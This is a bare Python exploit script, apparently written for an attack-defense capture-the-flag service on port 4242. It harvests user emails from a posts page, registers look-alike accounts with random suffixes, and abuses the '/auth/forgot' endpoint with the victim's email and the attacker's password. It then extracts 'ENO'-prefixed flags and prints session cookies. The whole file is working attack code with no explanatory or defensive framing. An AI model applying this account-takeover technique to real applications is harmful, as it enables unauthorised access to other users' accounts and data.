#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid

def generator(size=12, chars=string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def generator_pass(size=22, chars=string.digits + string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

ip = sys.argv[1]
url = 'http://{}:4242'.format(ip)

s = requests.Session()

#s.post(url + 'posts/view/0', timeout=(None,None))
html = s.get(url + '/posts/view/0', timeout=(None,None)).text

emails = re.findall('Activities by (.*)\s*', html, re.I)


files = {'image': ('pin.png', open('pin.png', 'rb'), 'image/png')} #file-type and file-name
for email in emails:
    password = generator_pass()

    data = {
        'email': email + '.' + generator() + '.net',
        'password': password,
    }
    resp = s.post(url + '/auth/signup', files=files, data=data, timeout=(None, None))

    data = {
        'email': email,
        'password': password,
    }

    print(resp.cookies.get_dict())

    resp = s.post(url + '/auth/forgot', files=files, data=data, timeout=(None, None))

    print(re.findall('ENO[A-Za-z0-9+/=]{48}', resp.text))




